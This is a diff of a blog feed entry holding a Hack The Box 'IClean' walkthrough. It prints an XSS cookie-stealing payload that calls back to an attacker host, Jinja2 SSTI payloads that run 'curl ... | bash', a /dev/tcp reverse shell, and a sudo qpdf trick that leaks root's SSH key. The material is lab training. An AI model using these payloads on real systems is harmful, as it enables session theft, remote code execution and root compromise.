@@ -15,7 +15,7 @@
             <pubDate>Thu, 01 Aug 2024 17:57:29 -0500</pubDate>
             
             <guid>https://scorpiosec.com/posts/2024/08/htb-iclean/</guid>
-            <description>Platform: Hack The Box Link: IClean Level: Medium OS: Linux The IClean challenge begins with a cleaning service website where we identify a form vulnerable to Cross-Site Scripting (XSS). Exploiting this vulnerability, we retrieve a session cookie and access the application dashboard. There, we discover an invoice generator susceptible to Server-Side Template Injection, which provides our initial foothold. Further exploration reveals the database credentials, allowing us to recover password hashes.</description>
+            <description>Platform: Hack The Box Link: IClean Level: Medium OS: Linux IClean begins with a cleaning service website where we identify a form vulnerable to Cross-Site Scripting (XSS). Exploiting this vulnerability, we retrieve a session cookie and access the application dashboard. There, we discover an invoice generator susceptible to Server-Side Template Injection (SSTI), which provides our initial foothold. Further exploration reveals the database credentials, allowing us to recover password hashes. By cracking one of these hashes, we gain SSH access and retrieve the user flag.</description>
             <content type="html"><![CDATA[<ul>
 <li>Platform: Hack The Box</li>
 <li>Link: <a href="https://app.hackthebox.com/machines/IClean" target="_blank" >IClean</a>
@@ -25,7 +25,7 @@
 <li>OS: Linux</li>
 </ul>
 <hr>
-<p>The IClean challenge begins with a cleaning service website where we identify a form vulnerable to Cross-Site Scripting (XSS). Exploiting this vulnerability, we retrieve a session cookie and access the application dashboard. There, we discover an invoice generator susceptible to Server-Side Template Injection, which provides our initial foothold. Further exploration reveals the database credentials, allowing us to recover password hashes. By cracking one of these hashes, we gain SSH access and retrieve the user flag. To obtain the root flag, we must exploit qpdf, and this write-up will demonstrate two different methods to achieve this.</p>
+<p>IClean begins with a cleaning service website where we identify a form vulnerable to Cross-Site Scripting (XSS). Exploiting this vulnerability, we retrieve a session cookie and access the application dashboard. There, we discover an invoice generator susceptible to Server-Side Template Injection (SSTI), which provides our initial foothold. Further exploration reveals the database credentials, allowing us to recover password hashes. By cracking one of these hashes, we gain SSH access and retrieve the user flag. To obtain the root flag, we must exploit qpdf, and this write-up will demonstrate two different methods to achieve this.</p>
 <p>Target IP address - <code>10.10.11.12</code></p>
 <h2 id="scanning">Scanning</h2>
 <pre tabindex="0"><code>nmap -sC -sV -oA nmap/IClean 10.10.11.12
@@ -54,7 +54,7 @@
 <p><img src="/images/HTB-IClean/capiclean.png" alt="IClean website"></p>
 <p>After looking around we found two functionalities that we may be able to exploit.</p>
 <ul>
-<li><code>http://capiclean.htb/quote</code> (using the <code>GET A QUOTE</code> button) leads us to a form where we can input an email address.</li>
+<li><code>http://capiclean.htb/quote</code> (using the <code>GET A QUOTE</code> button) leads us to a form where we can select which services we desire and also input an email address.</li>
 </ul>
 <p><img src="/images/HTB-IClean/capiclean-quote.png" alt="capiclean quote"></p>
 <p>After submitting an email address we get to <code>http://capiclean.htb/sendMessage</code>.</p>
@@ -66,12 +66,12 @@
 <p>Running gobuster we find  <code>/dashboard</code> but we get redirected to the Home page when we try to access it probably because we don&rsquo;t have a valid cookie.</p>
 <pre tabindex="0"><code>gobuster dir -u http://capiclean.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 </code></pre><p><img src="/images/HTB-IClean/gobuster.png" alt="directory brute forcing"></p>
-<p>We intercept the request we get after submitting the email at <code>/quote</code>, we are able to steal the admin cookie via XSS.</p>
+<p>We intercept the request we get after submitting the email at <code>/quote</code>, since there is a login feature but no sign in it button let&rsquo;s try to steal a session cookie in order to gain access the other pages.</p>
 <p><img src="/images/HTB-IClean/quote-request.png" alt="Request intercepted"></p>
 <p>Now we use our payload before sending the request.</p>
 <p><img src="/images/HTB-IClean/XSS-cookie-steal.png" alt="XSS cookie steal"></p>
 <p><strong>XSS Payload</strong></p>
-<pre tabindex="0"><code>service=&lt;img+src%3dx+onerror%3dthis.src%3d&#34;http%3a//10.10.14.46%3a8000/cookie.php&#34;%2bbtoa(document.cookie)&gt;
+<pre tabindex="0"><code>&lt;img+src%3dx+onerror%3dthis.src%3d&#34;http%3a//&lt;IP_ADDRESS&gt;%3a&lt;PORT_NUMBER&gt;/cookie.php&#34;%2bbtoa(document.cookie)&gt;
 </code></pre><p>We get the base64 cookie value.</p>
 <p><img src="/images/HTB-IClean/base64-cookie.png" alt="base64 cookie value"></p>
 <p><strong>Base64 cookie value</strong></p>
@@ -89,33 +89,36 @@
 <p><img src="/images/HTB-IClean/Invoice-doc.png" alt="IClean Invoce document"></p>
 <h2 id="initial-foothold">Initial Foothold</h2>
 <p>The application is clearly using some template engine to create the invoice documents which means it might be vulnerable to <code>Server Side Template Injection (SSTI)</code>. The thing is we need to find which template engine is being used.</p>
-<p>Using <code>Wappalyzer</code> I identify that the application is using <code>Flask</code> and I know that the commonly used template engines for Python are Jinja2, Mako, Genshi and Cheetah.</p>
+<p>Using <code>Wappalyzer</code> I identify that the application is using <code>Flask</code> and we know that the commonly used template engines for Python are Jinja2, Mako, Genshi and Cheetah.</p>
 <p><img src="/images/HTB-IClean/wappalyzer.png" alt="IClean wapplayzer"></p>
+<p>This <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python" target="_blank" >HackTricks</a>
+
+ page has various payloads to test for SSTI and identify the specific template used.</p>
 <p>We confirm that <code>Jinja2</code> is being used by using the payload <code>{{config}}</code> which returns the server&rsquo;s configuration. Now we just need to find the right payload to execute our commands on the server.</p>
 <p><img src="/images/HTB-IClean/SSTI-test.png" alt="SSTI test"></p>
 <p><img src="/images/HTB-IClean/SSTI-test2.png" alt="SSTI test results"></p>
 <p>After numerous fails I found a working payload on <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#filter-bypasses" target="_blank" >hacktricks</a>
 
-</p>
+.</p>
 <pre tabindex="0"><code>{%25with+a%3drequest|attr(&#34;application&#34;)|attr(&#34;\x5f\x5fglobals\x5f\x5f&#34;)|attr(&#34;\x5f\x5fgetitem\x5f\x5f&#34;)(&#34;\x5f\x5fbuiltins\x5f\x5f&#34;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;ls${IFS}-l&#39;)|attr(&#39;read&#39;)()%25}{%25print(a)%25}{%25endwith%25}
 </code></pre><p><img src="/images/HTB-IClean/SSTI-payload.png" alt="SSTI payload"></p>
 <p>The next step is to prompt the server to run our reverse shell. To do this, we’ll establish a Python server on our local machine and set up a listener on a port of our choosing. This will allow us to receive incoming connections from the reverse shell.</p>
-<p>Below is the content of my reverse shell file</p>
+<p>Below is the content of my reverse shell file.</p>
 <pre tabindex="0"><code>#!/bin/bash
 
 sh -i &gt;&amp; /dev/tcp/IP_ADDRESS/PORT_NUMBER 0&gt;&amp;1
 </code></pre><blockquote>
 <p>The reverse shell is inside the <code>revshell.sh</code> file. After we send the request containing our payload, the server fetches it from our python server and executes it.</p>
 </blockquote>
-<pre tabindex="0"><code>{%25with+a%3drequest|attr(&#34;application&#34;)|attr(&#34;\x5f\x5fglobals\x5f\x5f&#34;)|attr(&#34;\x5f\x5fgetitem\x5f\x5f&#34;)(&#34;\x5f\x5fbuiltins\x5f\x5f&#34;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;curl+http%3a//10.10.14.46%3a8000/revshell.sh+|+bash&#39;)|attr(&#39;read&#39;)()%25}{%25print(a)%25}{%25endwith%25}
-</code></pre><p>We get a foothold into the target system</p>
+<pre tabindex="0"><code>{%25with+a%3drequest|attr(&#34;application&#34;)|attr(&#34;\x5f\x5fglobals\x5f\x5f&#34;)|attr(&#34;\x5f\x5fgetitem\x5f\x5f&#34;)(&#34;\x5f\x5fbuiltins\x5f\x5f&#34;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;curl+http%3a//&lt;IP_ADDRESS&gt;%3a&lt;PORT_NUMBER&gt;/revshell.sh+|+bash&#39;)|attr(&#39;read&#39;)()%25}{%25print(a)%25}{%25endwith%25}
+</code></pre><p>We get a shell as <code>www-data</code>.</p>
 <p><img src="/images/HTB-IClean/foothold.png" alt="IClean foothold"></p>
 <h2 id="privilege-escalation">Privilege Escalation</h2>
-<p>In <code>/home</code> we are unable to access the directory <code>consuela</code></p>
+<p>In <code>/home</code> we are unable to access the directory <code>consuela</code>.</p>
 <p><img src="/images/HTB-IClean/consuella-denied.png" alt="IClean access denied"></p>
-<p>We are able to find some database credentials  in <code>opt/app/app.py</code>.</p>
+<p>Looking around we find some database credentials  in <code>opt/app/app.py</code>.</p>
 <p><img src="/images/HTB-IClean/db-credentials.png" alt="IClean database credentials"></p>
-<p>After running <code>ss -lntp</code> we see a service running on port 3306 which <code>MySQL</code> default port.</p>
+<p>After running <code>ss -lntp</code> we see a service running on port 3306 which is <code>MySQL</code> default port.</p>
 <p><img src="/images/HTB-IClean/services.png" alt="IClean internal services"></p>
 <p>We connect to the database with <code>iclean:pxCsmnGLckUb</code></p>
 <pre tabindex="0"><code>mysql -u iclean -p
@@ -123,21 +126,21 @@ sh -i &gt;&amp; /dev/tcp/IP_ADDRESS/PORT_NUMBER 0&gt;&amp;1
 <p><img src="/images/HTB-IClean/users-table.png" alt="IClean database users table"></p>
 <p>Using <a href="https://crackstation.net/" target="_blank" >crackstation</a>
 
- we get the user password which is <code>simple and clean</code></p>
+ we get the user password which is <code>simple and clean</code>.</p>
 <p><img src="/images/HTB-IClean/hash-cracked.png" alt="password hash cracked"></p>
 <blockquote>
 <p>The spaces are also part of the password.</p>
 </blockquote>
-<p>We use <code>consuela:simple and clean</code> to connect via SSH and retrieve the user flag <code>user.txt</code></p>
+<p>With the credentials <code>consuela:simple and clean</code> we login via SSH and retrieve the user flag <code>user.txt</code></p>
 <p><img src="/images/HTB-IClean/user-flag.png" alt="user flag"></p>
 <p><code>sudo -l</code> reveals that the user can run <code>/usr/bin/qpdf</code> as root.</p>
 <p><img src="/images/HTB-IClean/sudo-l.png" alt="sudo -l command"></p>
 <p>Going through the documentation for <a href="https://qpdf.readthedocs.io/en/stable/cli.html#option-add-attachment" target="_blank" >qpdf</a>
 
  we find that <code>--add-attachment</code> can be used to add attachments to a file.</p>
-<p>From here we have two ways to complete the challenge. We can grab the root SSH key by attaching it to a pdf file and login as the root user or we can directly attach the root flag to a pdf file, open it in a document viewer and read the flag.</p>
+<p>From here we have two ways to get the root flag. We can grab the root SSH key by attaching it to a pdf file and login as the root user or we can directly attach the root flag (because it is simply a .txt file) to a pdf file, open it in a document viewer and read the flag.</p>
 <h3 id="first-method">First method</h3>
-<p>First we can attach the SSH key for the root user to a pdf file, connect as the root user via SSH and grab the root flag.</p>
+<p>First we attach the SSH key for the root user to a pdf file, connect as the root user via SSH and grab the root flag.</p>
 <pre tabindex="0"><code>sudo /usr/bin/qpdf --empty /tmp/root.pdf --qdf --add-attachment /root/.ssh/id_rsa --
 </code></pre><p>The SSH key is in the output of the file. We only need to do <code>cat root.pdf</code> to get the SSH private key for the root user.</p>
 <p><img src="/images/HTB-IClean/root-ssh-key.png" alt="root ssh key"></p>
@@ -151,7 +154,8 @@ sh -i &gt;&amp; /dev/tcp/IP_ADDRESS/PORT_NUMBER 0&gt;&amp;1
 <p><img src="/images/HTB-IClean/pdf-attachment.png" alt="PDF Viewer Attachments"></p>
 <p>Double click <code>root.txt</code> and it will reveal the root flag.</p>
 <p><img src="/images/HTB-IClean/root-flag2.png" alt="root.txt file"></p>
-<p>If you&rsquo;d like to learn more about the web vulnerabilities featured on this box, you can do so on TryHackMe where they have some rooms focused on them (this not an exhaustive list)</p>
+<h2 id="closing-words">Closing Words</h2>
+<p>This box was easily one of my favorite on the platform, I like how inovative it was with the vulnerability chain. If you&rsquo;d like to learn more about the web vulnerabilities featured on this box, you can do so on TryHackMe where they have some rooms focused on them (this not an exhaustive list).</p>
 <p>XSS -&gt; <a href="https://tryhackme.com/r/room/axss" target="_blank" >XSS</a>
 
  and <a href="https://tryhackme.com/r/room/xss" target="_blank" >Intro to Cross-site Scripting</a>
